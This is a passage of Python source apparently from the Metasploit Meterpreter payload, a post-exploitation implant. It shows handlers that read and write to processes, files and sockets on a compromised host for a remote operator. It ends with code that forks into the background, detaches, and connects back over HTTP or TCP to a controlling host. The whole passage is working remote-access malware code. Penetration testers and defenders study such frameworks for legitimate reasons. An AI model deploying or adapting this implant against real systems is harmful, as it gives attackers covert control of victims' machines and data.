			self.session_expiry_time = timeout_value
			self.session_expiry_end = time.time() + self.session_expiry_time
		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
		if timeout_value:
			self.transport.communication_timeout = timeout_value
		retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value')
		if retry_value:
			self.transport.retry_total = retry_value
		retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value')
		if retry_value:
			self.transport.retry_wait = retry_value

		if self.session_expiry_time > 0:
			response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
		response += self.transport.tlv_pack_timeouts()
		return ERROR_SUCCESS, response

	def _core_transport_sleep(self, request, response):
		seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
		if seconds:
			self.transport.deactivate()
			time.sleep(seconds)
			if not self.transport.activate():
				self.transport_change()
		return None

	def _core_channel_open(self, request, response):
		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
		handler = 'channel_open_' + channel_type['value']
		if handler not in self.extension_functions:
			return error_result(NotImplementedError), response
		handler = self.extension_functions[handler]
		return handler(request, response)

	def _core_channel_close(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		if isinstance(channel, subprocess.Popen):
			channel.kill()
		elif isinstance(channel, MeterpreterFile):
			channel.close()
		elif isinstance(channel, MeterpreterSocket):
			channel.close()
		else:
			return ERROR_FAILURE, response
		del self.channels[channel_id]
		if channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		return ERROR_SUCCESS, response

	def _core_channel_eof(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		result = False
		if isinstance(channel, MeterpreterFile):
			result = channel.tell() >= os.fstat(channel.fileno()).st_size
		response += tlv_pack(TLV_TYPE_BOOL, result)
		return ERROR_SUCCESS, response

	def _core_channel_interact(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		toggle = packet_get_tlv(request, TLV_TYPE_BOOL)['value']
		if toggle:
			if channel_id in self.interact_channels:
				self.interact_channels.remove(channel_id)
			else:
				self.interact_channels.append(channel_id)
		elif channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		return ERROR_SUCCESS, response

	def _core_channel_read(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		data = ''
		if isinstance(channel, STDProcess):
			if channel.poll() != None:
				self.handle_dead_resource_channel(channel_id)
			if channel.stdout_reader.is_read_ready():
				data = channel.stdout_reader.read(length)
		elif isinstance(channel, MeterpreterFile):
			data = channel.read(length)
		elif isinstance(channel, MeterpreterSocket):
			data = channel.recv(length)
		else:
			return ERROR_FAILURE, response
		response += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
		return ERROR_SUCCESS, response

	def _core_channel_write(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
		length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		l = len(channel_data)
		if isinstance(channel, subprocess.Popen):
			if channel.poll() != None:
				self.handle_dead_resource_channel(channel_id)
				return ERROR_FAILURE, response
			channel.write(channel_data)
		elif isinstance(channel, MeterpreterFile):
			channel.write(channel_data)
		elif isinstance(channel, MeterpreterSocket):
			try:
				l = channel.send(channel_data)
			except socket.error:
				channel.close()
				self.handle_dead_resource_channel(channel_id)
				return ERROR_FAILURE, response
		else:
			return ERROR_FAILURE, response
		response += tlv_pack(TLV_TYPE_LENGTH, l)
		return ERROR_SUCCESS, response

	def create_response(self, request):
		resp = struct.pack('>I', PACKET_TYPE_RESPONSE)
		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
		resp += tlv_pack(method_tlv)

		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
		resp += tlv_pack(reqid_tlv)

		handler_name = method_tlv['value']
		if handler_name in self.extension_functions:
			handler = self.extension_functions[handler_name]
			try:
				self.debug_print('[*] running method ' + handler_name)
				result = handler(request, resp)
				if result is None:
					return
				result, resp = result
			except Exception:
				self.debug_print('[-] method ' + handler_name + ' resulted in an error')
				if DEBUGGING:
					traceback.print_exc(file=sys.stderr)
				result = error_result()
		else:
			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
			result = error_result(NotImplementedError)
		return tlv_pack_response(result, resp)

if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
	if hasattr(os, 'setsid'):
		try:
			os.setsid()
		except OSError:
			pass
	if HTTP_CONNECTION_URL and has_urllib:
		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
	else:
		transport = TcpTransport.from_socket(s)
	met = PythonMeterpreter(transport)
	met.run()
